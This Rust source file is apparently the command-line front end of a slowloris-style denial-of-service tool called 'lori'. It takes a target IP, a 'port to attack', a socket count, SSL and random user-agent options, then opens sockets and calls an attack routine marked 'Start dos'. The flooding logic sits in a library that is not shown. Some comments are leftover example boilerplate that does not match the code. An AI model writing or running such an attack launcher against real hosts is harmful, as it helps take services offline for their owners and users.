extern crate pretty_env_logger;
#[macro_use] extern crate log;
#[macro_use] extern crate structopt;

use std::path::PathBuf;
use structopt::StructOpt;

use std::env;
use std::error::Error;
use std::net::{Ipv4Addr, SocketAddr, TcpStream};

// /// Verbosity level
// static LOG_LEVEL: u8 = 0;
use lori::*;


/// A basic example
#[derive(StructOpt, Debug)]
#[structopt(name = "basic")]
struct Opt {
    // A flag, true if used in the command line. Note doc comment will
    // be used for the help message of the flag.
    /// Activate ssl mode
    #[structopt(long = "ssl")]
    ssl: bool,

    /// Use a random user-agent 
    #[structopt(short = "r", long = "rand-user-agent")]
    rand_ua: bool,

    /// Set number of sockets
    #[structopt(short = "s", long = "sockets", default_value = "150")]
    sockets: usize,

    /// Set port to attack
    #[structopt(short = "p", long = "port", default_value = "80")]
    port: u16,

    /// Files to process
    #[structopt(name = "IP")]
    ip: String,
}


fn main() -> Result<(), Box<dyn Error>> {


    let opt = Opt::from_args();

    //Set the `RUST_LOG` var if none is provided
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "lori=INFO");
    }

    pretty_env_logger::init_timed();


    // Calling .unwrap() is safe here because "INPUT" is required (if "INPUT" wasn't
    // required we could have used an 'if let' to conditionally get the value)
    // println!("Using input file: {}", matches.value_of("INPUT").unwrap());

    // Vary the output based on how many times the user used the "verbose" flag
    // (i.e. 'myprog -v -v -v' or 'myprog -vvv' vs 'myprog -v'
    // match matches.occurrences_of("v") {
    //     0 => println!("No verbose info"),
    //     1 => println!("Some verbose info"),
    //     2 => println!("Tons of verbose info"),
    //     3 | _ => println!("Don't be crazy"),
    // }

    // TODO Create config from CLI arguments using Clap
    let config = Config {
        https: opt.ssl,
        addr: opt.ip,
        port: opt.port,
        rand_ua: opt.rand_ua,
        socket_count: opt.sockets,
    };

    let mut lori = Lori::new(config);


    // Create initial sockets
    lori.create_sockets()?;

    // Start dos
    lori.attack()?;

    Ok(())
}


// /// Logs a function at given level
// fn log(log: &str, level: u8){
//     if LOG_LEVEL >= level {
//         println!("{}", log);
//     }

// }
